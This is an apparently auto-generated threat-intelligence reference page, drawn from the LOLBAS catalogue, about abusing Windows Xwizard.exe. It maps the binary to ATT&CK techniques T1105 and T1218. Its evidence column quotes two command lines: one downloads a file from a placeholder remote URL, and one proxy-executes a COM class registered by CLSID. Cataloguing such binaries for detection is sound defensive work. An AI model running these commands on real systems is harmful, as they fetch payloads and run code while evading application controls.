---
parsed_by: focuslocust
source: lolbas
type: generated
---
# Xwizard.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `xwizard.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Xwizard.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

Execute custom class that has been added to the registry or download a file with Xwizard.exe

## Fast Retrieval

- Platform: `windows`
- Command page: [commands](../../commands/windows/xwizard.md)
- Source verification: [source record](../../sources/lolbas/xwizard.exe.md)

## Aliases

- `Xwizard.exe`
- `xwizard.exe`

## Related ATT&CK Techniques

| Item | Relationship | Confidence | Evidence |
| --- | --- | --- | --- |
| [T1105 - Ingress Tool Transfer](../../attack/techniques/T1105-ingress-tool-transfer.md) | explicit | source | Command metadata lists T1105: xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /z{REMOTEURL} |
| [T1218 - System Binary Proxy Execution](../../attack/techniques/T1218-system-binary-proxy-execution.md) | explicit | source | Command metadata lists T1218: xwizard RunWizard /taero /u {00000001-0000-0000-0000-0000FEEDACDC} |

## Detection / Analysis Notes

This source record contains detection or analysis material. It is preserved on the source-record page rather than promoted into a full detection engineering page.

[source record](../../sources/lolbas/xwizard.exe.md)

## Source Verification

[source record](../../sources/lolbas/xwizard.exe.md)

## Evidence Excerpt

```text
Acknowledgement:
- Handle: '@Hexacorn'
Person: Adam
- Handle: '@NickTyrer'
Person: Nick Tyrer
- Handle: '@harr0ey'
Person: harr0ey
- Handle: '@notwhickey'
```
